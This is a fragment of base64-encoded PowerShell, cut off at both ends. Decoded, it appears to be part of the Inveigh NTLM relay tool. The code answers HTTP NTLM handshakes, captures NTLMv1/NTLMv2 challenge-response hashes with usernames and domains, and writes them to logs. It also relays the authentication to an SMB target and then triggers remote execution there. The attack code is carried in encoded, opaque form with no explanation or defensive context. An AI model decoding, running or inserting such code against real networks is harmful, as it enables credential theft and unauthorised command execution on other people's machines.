nLmFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5hZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU01CIHJlbGF5IHRhcmdldCBpcyBub3QgcmVzcG9uZGluZyIpXSkKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guU01CX3JlbGF5X2FjdGl2ZV9zdGVwID0gMAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5TTUJfcmVsYXlfYWN0aXZlX3N0ZXAgLWVxIDEpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2J5dGVzID0gU01CUmVsYXlDaGFsbGVuZ2UgJFNNQl9yZWxheV9zb2NrZXQgJEhUVFBfcmVxdWVzdF9ieXRlcwogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5TTUJfcmVsYXlfYWN0aXZlX3N0ZXAgPSAyCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfYnl0ZXMgPSAkU01CX3JlbGF5X2J5dGVzWzIuLiRTTUJfcmVsYXlfYnl0ZXMubGVuZ3RoXQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3VzZXJfSUQgPSAkU01CX3JlbGF5X2J5dGVzWzM0Li4zM10KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9OVExNU1NQID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkU01CX3JlbGF5X2J5dGVzKQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X05UTE1TU1AgPSAkU01CX3JlbGF5X05UTE1TU1AgLXJlcGxhY2UgIi0iLCIiCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfTlRMTVNTUF9pbmRleCA9ICRTTUJfcmVsYXlfTlRMTVNTUC5JbmRleE9mKCI0RTU0NEM0RDUzNTM1MDAwIikKICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9OVExNU1NQX2J5dGVzX2luZGV4ID0gJFNNQl9yZWxheV9OVExNU1NQX2luZGV4IC8gMgogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2RvbWFpbl9sZW5ndGggPSBEYXRhTGVuZ3RoICgkU01CX3JlbGF5X05UTE1TU1BfYnl0ZXNfaW5kZXggKyAxMikgJFNNQl9yZWxheV9ieXRlcwogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2RvbWFpbl9sZW5ndGhfb2Zmc2V0X2J5dGVzID0gJFNNQl9yZWxheV9ieXRlc1soJFNNQl9yZWxheV9OVExNU1NQX2J5dGVzX2luZGV4ICsgMTIpLi4oJFNNQl9yZWxheV9OVExNU1NQX2J5dGVzX2luZGV4ICsgMTkpXQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3RhcmdldF9sZW5ndGggPSBEYXRhTGVuZ3RoICgkU01CX3JlbGF5X05UTE1TU1BfYnl0ZXNfaW5kZXggKyA0MCkgJFNNQl9yZWxheV9ieXRlcwogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3RhcmdldF9sZW5ndGhfb2Zmc2V0X2J5dGVzID0gJFNNQl9yZWxheV9ieXRlc1soJFNNQl9yZWxheV9OVExNU1NQX2J5dGVzX2luZGV4ICsgNDApLi4oJFNNQl9yZWxheV9OVExNU1NQX2J5dGVzX2luZGV4ICsgNTUgKyAkU01CX2RvbWFpbl9sZW5ndGgpXQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X05UTE1fY2hhbGxlbmdlID0gJFNNQl9yZWxheV9ieXRlc1soJFNNQl9yZWxheV9OVExNU1NQX2J5dGVzX2luZGV4ICsgMjQpLi4oJFNNQl9yZWxheV9OVExNU1NQX2J5dGVzX2luZGV4ICsgMzEpXQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X3RhcmdldF9kZXRhaWxzID0gJFNNQl9yZWxheV9ieXRlc1soJFNNQl9yZWxheV9OVExNU1NQX2J5dGVzX2luZGV4ICsgNTYgKyAkU01CX2RvbWFpbl9sZW5ndGgpLi4oJFNNQl9yZWxheV9OVExNU1NQX2J5dGVzX2luZGV4ICsgNTUgKyAkU01CX2RvbWFpbl9sZW5ndGggKyAkU01CX3RhcmdldF9sZW5ndGgpXQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBbYnl0ZVtdXSAkSFRUUF9OVExNX2J5dGVzID0gKDB4NGUsMHg1NCwweDRjLDB4NGQsMHg1MywweDUzLDB4NTAsMHgwMCwweDAyLDB4MDAsMHgwMCwweDAwKWAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICsgJFNNQl9kb21haW5fbGVuZ3RoX29mZnNldF9ieXRlc2AKICAgICAgICAgICAgICAgICAgICAgICAgICAgICsgKDB4MDUsMHg4MiwweDg5LDB4YTIpYAogICAgICAgICAgICAgICAgICAgICAgICAgICAgKyAkU01CX3JlbGF5X05UTE1fY2hhbGxlbmdlYAogICAgICAgICAgICAgICAgICAgICAgICAgICAgKyAoMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwKWAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICsgJFNNQl90YXJnZXRfbGVuZ3RoX29mZnNldF9ieXRlc2AKICAgICAgICAgICAgICAgICAgICAgICAgICAgICsgJFNNQl9yZWxheV90YXJnZXRfZGV0YWlscwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAkTlRMTV9jaGFsbGVuZ2VfYmFzZTY0ID0gW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJEhUVFBfTlRMTV9ieXRlcykKICAgICAgICAgICAgICAgICAgICAgICAgJE5UTE0gPSAnTlRMTSAnICsgJE5UTE1fY2hhbGxlbmdlX2Jhc2U2NAogICAgICAgICAgICAgICAgICAgICAgICAkTlRMTV9jaGFsbGVuZ2UgPSBTTUJOVExNQ2hhbGxlbmdlICRTTUJfcmVsYXlfYnl0ZXMKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guSFRUUF9jaGFsbGVuZ2VfcXVldWUuQWRkKCRpbnZlaWdoLnJlcXVlc3QuUmVtb3RlRW5kcG9pbnQuQWRkcmVzcy5JUEFkZHJlc3NUb1N0cmluZyArICRpbnZlaWdoLnJlcXVlc3QuUmVtb3RlRW5kcG9pbnQuUG9ydCArICcsJyArICROVExNX2NoYWxsZW5nZSkKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5hZGQoIlJlY2VpdmVkIGNoYWxsZW5nZSAkTlRMTV9jaGFsbGVuZ2UgZm9yIHJlbGF5IGZyb20gJFNNQlJlbGF5VGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLmFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5hZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gUmVjZWl2ZWQgY2hhbGxlbmdlICROVExNX2NoYWxsZW5nZSBmb3IgcmVsYXkgZnJvbSAkU01CUmVsYXlUYXJnZXQiKV0pCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuYWRkKCJQcm92aWRpbmcgY2hhbGxlbmdlICROVExNX2NoYWxsZW5nZSBmb3IgcmVsYXkgdG8gIiArICRpbnZlaWdoLnJlcXVlc3QuUmVtb3RlRW5kcG9pbnQuQWRkcmVzcykKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLmFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5hZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gUHJvdmlkaW5nIGNoYWxsZW5nZSAkTlRMTV9jaGFsbGVuZ2UgZm9yIHJlbGF5IHRvICIgKyAkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LkFkZHJlc3MpXSkKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guU01CX3JlbGF5X2FjdGl2ZV9zdGVwID0gMwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkTlRMTSA9IE5UTE1DaGFsbGVuZ2VCYXNlNjQKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICROVExNID0gTlRMTUNoYWxsZW5nZUJhc2U2NAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5yZXNwb25zZS5TdGF0dXNDb2RlID0gNDAxCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlaWYgKCRIVFRQX3JlcXVlc3RfYnl0ZXNbOF0gLWVxIDMpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICROVExNID0gJ05UTE0nCiAgICAgICAgICAgICAgICAkSFRUUF9OVExNX29mZnNldCA9ICRIVFRQX3JlcXVlc3RfYnl0ZXNbMjRdCiAgICAgICAgICAgICAgICAkSFRUUF9OVExNX2xlbmd0aCA9IERhdGFMZW5ndGggMjIgJEhUVFBfcmVxdWVzdF9ieXRlcwogICAgICAgICAgICAgICAgJEhUVFBfTlRMTV9kb21haW5fbGVuZ3RoID0gRGF0YUxlbmd0aCAyOCAkSFRUUF9yZXF1ZXN0X2J5dGVzCiAgICAgICAgICAgICAgICAkSFRUUF9OVExNX2RvbWFpbl9vZmZzZXQgPSBEYXRhTGVuZ3RoIDMyICRIVFRQX3JlcXVlc3RfYnl0ZXMKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgW3N0cmluZ10kTlRMTV9jaGFsbGVuZ2UgPSAkaW52ZWlnaC5IVFRQX2NoYWxsZW5nZV9xdWV1ZSAtbGlrZSAkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LkFkZHJlc3MuSVBBZGRyZXNzVG9TdHJpbmcgKyAkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LlBvcnQgKyAnKicKICAgICAgICAgICAgICAgICRpbnZlaWdoLkhUVFBfY2hhbGxlbmdlX3F1ZXVlLlJlbW92ZSgkTlRMTV9jaGFsbGVuZ2UpCiAgICAgICAgICAgICAgICAkTlRMTV9jaGFsbGVuZ2UgPSAkTlRMTV9jaGFsbGVuZ2UuU3Vic3RyaW5nKCgkTlRMTV9jaGFsbGVuZ2UuSW5kZXhPZigiLCIpKSsxKQogICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYoJEhUVFBfTlRMTV9kb21haW5fbGVuZ3RoIC1lcSAwKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRIVFRQX05UTE1fZG9tYWluX3N0cmluZyA9ICcnCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7ICAKICAgICAgICAgICAgICAgICAgICAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmcgPSBEYXRhVG9TdHJpbmcgJEhUVFBfTlRMTV9kb21haW5fbGVuZ3RoIDAgMCAkSFRUUF9OVExNX2RvbWFpbl9vZmZzZXQgJEhUVFBfcmVxdWVzdF9ieXRlcwogICAgICAgICAgICAgICAgfSAKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICRIVFRQX05UTE1fdXNlcl9sZW5ndGggPSBEYXRhTGVuZ3RoIDM2ICRIVFRQX3JlcXVlc3RfYnl0ZXMKICAgICAgICAgICAgICAgICRIVFRQX05UTE1fdXNlcl9zdHJpbmcgPSBEYXRhVG9TdHJpbmcgJEhUVFBfTlRMTV91c2VyX2xlbmd0aCAkSFRUUF9OVExNX2RvbWFpbl9sZW5ndGggMCAkSFRUUF9OVExNX2RvbWFpbl9vZmZzZXQgJEhUVFBfcmVxdWVzdF9ieXRlcwogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICRIVFRQX05UTE1faG9zdF9sZW5ndGggPSBEYXRhTGVuZ3RoIDQ0ICRIVFRQX3JlcXVlc3RfYnl0ZXMKICAgICAgICAgICAgICAgICRIVFRQX05UTE1faG9zdF9zdHJpbmcgPSBEYXRhVG9TdHJpbmcgJEhUVFBfTlRMTV9ob3N0X2xlbmd0aCAkSFRUUF9OVExNX2RvbWFpbl9sZW5ndGggJEhUVFBfTlRMTV91c2VyX2xlbmd0aCAkSFRUUF9OVExNX2RvbWFpbl9vZmZzZXQgJEhUVFBfcmVxdWVzdF9ieXRlcwogICAgICAgIAogICAgICAgICAgICAgICAgaWYoJEhUVFBfTlRMTV9sZW5ndGggLWVxIDI0KSAjIE5UTE12MQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICROVExNX3R5cGUgPSAiTlRMTXYxIgogICAgICAgICAgICAgICAgICAgICROVExNX3Jlc3BvbnNlID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkSFRUUF9yZXF1ZXN0X2J5dGVzWygkSFRUUF9OVExNX29mZnNldCAtIDI0KS4uKCRIVFRQX05UTE1fb2Zmc2V0ICsgJEhUVFBfTlRMTV9sZW5ndGgpXSkgLXJlcGxhY2UgIi0iLCIiCiAgICAgICAgICAgICAgICAgICAgJE5UTE1fcmVzcG9uc2UgPSAkTlRMTV9yZXNwb25zZS5JbnNlcnQoNDgsJzonKQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLkhUVFBfTlRMTV9oYXNoID0gJEhUVFBfTlRMTV91c2VyX3N0cmluZyArICI6OiIgKyAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmcgKyAiOiIgKyAkTlRMTV9yZXNwb25zZSArICI6IiArICROVExNX2NoYWxsZW5nZQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmKCgoJE5UTE1fY2hhbGxlbmdlIC1uZSAnJykgLWFuZCAoJE5UTE1fcmVzcG9uc2UgLW5lICcnKSkgLWFuZCAoKCRNYWNoaW5lQWNjb3VudHMgLWVxICd5JykgLW9yICgoJE1hY2hpbmVBY2NvdW50cyAtZXEgJ24nKSAtYW5kICgtbm90ICRIVFRQX05UTE1fdXNlcl9zdHJpbmcuRW5kc1dpdGgoJyQnKSkpKSkKICAgICAgICAgICAgICAgICAgICB7ICAgIAogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuYWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLmFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSAkSFRUUF90eXBlIE5UTE12MSBjaGFsbGVuZ2UvcmVzcG9uc2UgZm9yICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGNhcHR1cmVkIGZyb20gIiArICRpbnZlaWdoLnJlcXVlc3QuUmVtb3RlRW5kcG9pbnQuQWRkcmVzcyArICIoIiArICRIVFRQX05UTE1faG9zdF9zdHJpbmcgKyAiKSIpXSkKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guTlRMTXYxX2ZpbGVfcXVldWUuYWRkKCRpbnZlaWdoLkhUVFBfTlRMTV9oYXNoKQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5OVExNdjFfbGlzdC5hZGQoJGludmVpZ2guSFRUUF9OVExNX2hhc2gpCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuYWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRIVFRQX3R5cGUgTlRMTXYxIGNoYWxsZW5nZS9yZXNwb25zZSBjYXB0dXJlZCBmcm9tICIgKyAkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LkFkZHJlc3MgKyAiKCIgKyAkSFRUUF9OVExNX2hvc3Rfc3RyaW5nICsgIik6YG4iICsgJGludmVpZ2guSFRUUF9OVExNX2hhc2gpCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5hZGQoIiRIVFRQX3R5cGUgTlRMTXYxIGNoYWxsZW5nZS9yZXNwb25zZSB3cml0dGVuIHRvICIgKyAkaW52ZWlnaC5OVExNdjFfb3V0X2ZpbGUpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmICgoJGludmVpZ2guSVBfY2FwdHVyZV9saXN0IC1ub3Rjb250YWlucyAkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LkFkZHJlc3MpIC1hbmQgKC1ub3QgJEhUVFBfTlRMTV91c2VyX3N0cmluZy5FbmRzV2l0aCgnJCcpKSAtYW5kICghJGludmVpZ2guc3Bvb2Zlcl9yZXBlYXQpKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guSVBfY2FwdHVyZV9saXN0ICs9ICRpbnZlaWdoLnJlcXVlc3QuUmVtb3RlRW5kcG9pbnQuQWRkcmVzcwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgIyBOVExNdjIKICAgICAgICAgICAgICAgIHsgICAKICAgICAgICAgICAgICAgICAgICAkTlRMTV90eXBlID0gIk5UTE12MiIgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICROVExNX3Jlc3BvbnNlID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkSFRUUF9yZXF1ZXN0X2J5dGVzWyRIVFRQX05UTE1fb2Zmc2V0Li4oJEhUVFBfTlRMTV9vZmZzZXQgKyAkSFRUUF9OVExNX2xlbmd0aCldKSAtcmVwbGFjZSAiLSIsIiIKICAgICAgICAgICAgICAgICAgICAkTlRMTV9yZXNwb25zZSA9ICROVExNX3Jlc3BvbnNlLkluc2VydCgzMiwnOicpCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guSFRUUF9OVExNX2hhc2ggPSAkSFRUUF9OVExNX3VzZXJfc3RyaW5nICsgIjo6IiArICRIVFRQX05UTE1fZG9tYWluX3N0cmluZyArICI6IiArICROVExNX2NoYWxsZW5nZSArICI6IiArICROVExNX3Jlc3BvbnNlCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYoKCgkTlRMTV9jaGFsbGVuZ2UgLW5lICcnKSAtYW5kICgkTlRMTV9yZXNwb25zZSAtbmUgJycpKSAtYW5kICgoJE1hY2hpbmVBY2NvdW50cyAtZXEgJ3knKSAtb3IgKCgkTWFjaGluZUFjY291bnRzIC1lcSAnbicpIC1hbmQgKC1ub3QgJEhUVFBfTlRMTV91c2VyX3N0cmluZy5FbmRzV2l0aCgnJCcpKSkpKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLmFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5hZGQoJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgKyAiIC0gJEhUVFBfdHlwZSBOVExNdjIgY2hhbGxlbmdlL3Jlc3BvbnNlIGZvciAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyBjYXB0dXJlZCBmcm9tICIgKyAkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LmFkZHJlc3MgKyAiKCIgKyAkSFRUUF9OVExNX2hvc3Rfc3RyaW5nICsgIikiKV0pCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLk5UTE12Ml9maWxlX3F1ZXVlLmFkZCgkaW52ZWlnaC5IVFRQX05UTE1faGFzaCkKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guTlRMTXYyX2xpc3QuYWRkKCRpbnZlaWdoLkhUVFBfTlRMTV9oYXNoKQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLmFkZCgkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSArICIgLSAkSFRUUF90eXBlIE5UTE12MiBjaGFsbGVuZ2UvcmVzcG9uc2UgY2FwdHVyZWQgZnJvbSAiICsgJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5hZGRyZXNzICsgIigiICsgJEhUVFBfTlRMTV9ob3N0X3N0cmluZyArICIpOmBuIiArICRpbnZlaWdoLkhUVFBfTlRMTV9oYXNoKQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuYWRkKCIkSFRUUF90eXBlIE5UTE12MiBjaGFsbGVuZ2UvcmVzcG9uc2Ugd3JpdHRlbiB0byAiICsgJGludmVpZ2guTlRMTXYyX291dF9maWxlKQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZiAoKCRpbnZlaWdoLklQX2NhcHR1cmVfbGlzdCAtbm90Y29udGFpbnMgJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5BZGRyZXNzKSAtYW5kICgtbm90ICRIVFRQX05UTE1fdXNlcl9zdHJpbmcuRW5kc1dpdGgoJyQnKSkgLWFuZCAoISRpbnZlaWdoLnNwb29mZXJfcmVwZWF0KSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLklQX2NhcHR1cmVfbGlzdCArPSAkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LkFkZHJlc3MKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICRpbnZlaWdoLnJlc3BvbnNlLlN0YXR1c0NvZGUgPSAyMDAKICAgICAgICAgICAgICAgICROVExNX2NoYWxsZW5nZSA9ICcnCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmICgoJGludmVpZ2guU01CX3JlbGF5KSAtYW5kICgkaW52ZWlnaC5TTUJfcmVsYXlfYWN0aXZlX3N0ZXAgLWVxIDMpKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGlmKCghJFNNQlJlbGF5VXNlcm5hbWVzKSAtb3IgKCRTTUJSZWxheVVzZXJuYW1lcyAtY29udGFpbnMgJEhUVFBfTlRMTV91c2VyX3N0cmluZykgLW9yICgkU01CUmVsYXlVc2VybmFtZXMgLWNvbnRhaW5zICIkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyIpKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYoKCRNYWNoaW5lQWNjb3VudHMgLWVxICd5JykgLW9yICgoJE1hY2hpbmVBY2NvdW50cyAtZXEgJ24nKSAtYW5kICgtbm90ICRIVFRQX05UTE1fdXNlcl9zdHJpbmcuRW5kc1dpdGgoJyQnKSkpKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5TTUJSZWxheV9mYWlsZWRfbGlzdCAtbm90Y29udGFpbnMgIiRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nICRTTUJSZWxheVRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJE5UTE1fdHlwZSAtZXEgJ05UTE12MicpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLmFkZCgiU2VuZGluZyAkTlRMTV90eXBlIHJlc3BvbnNlIGZvciAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyBmb3IgcmVsYXkgdG8gJFNNQlJlbGF5dGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLmFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5hZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU2VuZGluZyAkTlRMTV90eXBlIHJlc3BvbnNlIGZvciAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyBmb3IgcmVsYXkgdG8gJFNNQlJlbGF5dGFyZ2V0IildKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X3Jlc3BvbnNlX3JldHVybl9ieXRlcyA9IFNNQlJlbGF5UmVzcG9uc2UgJFNNQl9yZWxheV9zb2NrZXQgJEhUVFBfcmVxdWVzdF9ieXRlcyAkU01CX3VzZXJfSUQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9yZXNwb25zZV9yZXR1cm5fYnl0ZXMgPSAkU01CX3JlbGF5X3Jlc3BvbnNlX3JldHVybl9ieXRlc1sxLi4kU01CX3JlbGF5X3Jlc3BvbnNlX3JldHVybl9ieXRlcy5sZW5ndGhdCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCghJFNNQl9yZWxheV9mYWlsZWQpIC1hbmQgKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFNNQl9yZWxheV9yZXNwb25zZV9yZXR1cm5fYnl0ZXNbOS4uMTJdKSAtZXEgKCcwMC0wMC0wMC0wMCcpKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5hZGQoIiRIVFRQX3R5cGUgdG8gU01CIHJlbGF5IGF1dGhlbnRpY2F0aW9uIHN1Y2Nlc3NmdWwgZm9yICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIG9uICRTTUJSZWxheVRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuYWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLmFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSAkSFRUUF90eXBlIHRvIFNNQiByZWxheSBhdXRoZW50aWNhdGlvbiBzdWNjZXNzZnVsIGZvciAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyBvbiAkU01CUmVsYXlUYXJnZXQiKV0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5TTUJfcmVsYXlfYWN0aXZlX3N0ZXAgPSA0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTTUJSZWxheUV4ZWN1dGUgJFNNQl9yZWxheV9zb2NrZXQgJFNNQl91c2VyX0lEICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5hZGQoIiRIVFRQX3R5cGUgdG8gU01CIHJlbGF5IGF1dGhlbnRpY2F0aW9uIGZhaWxlZCBmb3IgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgb24gJFNNQlJlbGF5VGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZ